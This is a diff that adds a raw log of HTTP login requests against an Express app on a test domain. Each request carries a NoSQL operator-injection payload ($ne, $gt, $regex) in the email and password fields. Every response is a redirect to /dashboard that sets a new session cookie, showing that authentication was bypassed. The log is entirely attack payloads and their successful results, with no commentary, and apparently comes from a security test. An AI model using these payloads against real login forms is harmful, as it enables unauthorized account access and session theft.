@@ -1,0 +1,65 @@
+########## email=admin%40nexaidentity.test&password%5B%24ne%5D=x
+HTTP/1.1 302 Found
+X-Powered-By: Express
+Location: /dashboard
+Vary: Accept
+Content-Type: text/plain; charset=utf-8
+Content-Length: 32
+Set-Cookie: connect.sid=s%3ARWUtYMEf8xTl7itsHKyLTPRgV9llyMzR.fKpBRXhmAqvFqPDgmmrRcUt%2FUixpYxyv8quhMKk7JL8; Path=/; HttpOnly; SameSite=Lax
+Date: Sun, 08 Nov 2026 01:19:00 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+Found. Redirecting to /dashboard
+########## email%5B%24ne%5D=x&password%5B%24ne%5D=x
+HTTP/1.1 302 Found
+X-Powered-By: Express
+Location: /dashboard
+Vary: Accept
+Content-Type: text/plain; charset=utf-8
+Content-Length: 32
+Set-Cookie: connect.sid=s%3AjTJA3dqiHHOFN9HvZdEROVJLMpsgkWcy.kTag7QqIspdpMCghERcu%2Fl1aifr3AaAVkSR0jawNRF0; Path=/; HttpOnly; SameSite=Lax
+Date: Sun, 08 Nov 2026 01:19:01 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+Found. Redirecting to /dashboard
+########## email%5B%24ne%5D=&password%5B%24ne%5D=
+HTTP/1.1 302 Found
+X-Powered-By: Express
+Location: /dashboard
+Vary: Accept
+Content-Type: text/plain; charset=utf-8
+Content-Length: 32
+Set-Cookie: connect.sid=s%3AR990tDFOVIve9aWhkqfQs9D1N0unyqP6.THsKWKFU%2FbttzZE%2Ft2iY8YERn7oxFbMjOG9jzrXget8; Path=/; HttpOnly; SameSite=Lax
+Date: Sun, 08 Nov 2026 01:19:01 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+Found. Redirecting to /dashboard
+########## email%5B%24gt%5D=&password%5B%24gt%5D=
+HTTP/1.1 302 Found
+X-Powered-By: Express
+Location: /dashboard
+Vary: Accept
+Content-Type: text/plain; charset=utf-8
+Content-Length: 32
+Set-Cookie: connect.sid=s%3AAGjkwe5HiqkWP4jelqVQlTKlchebbjp0.6K%2FKnDaAobyzOu4P9RtiSMvHyhkNFU1LKub74ze%2FLdc; Path=/; HttpOnly; SameSite=Lax
+Date: Sun, 08 Nov 2026 01:19:01 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+Found. Redirecting to /dashboard
+########## email=admin%40nexaidentity.test&password%5B%24regex%5D=.*
+HTTP/1.1 302 Found
+X-Powered-By: Express
+Location: /dashboard
+Vary: Accept
+Content-Type: text/plain; charset=utf-8
+Content-Length: 32
+Set-Cookie: connect.sid=s%3Al9K7CvdB2dc0QDeM9g49-T4bLzEvXxiC.tkKsMxRH6nLAHY%2FOShFbAEwvNTcrL2lgHvdCver3eHs; Path=/; HttpOnly; SameSite=Lax
+Date: Sun, 08 Nov 2026 01:19:01 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+Found. Redirecting to /dashboard
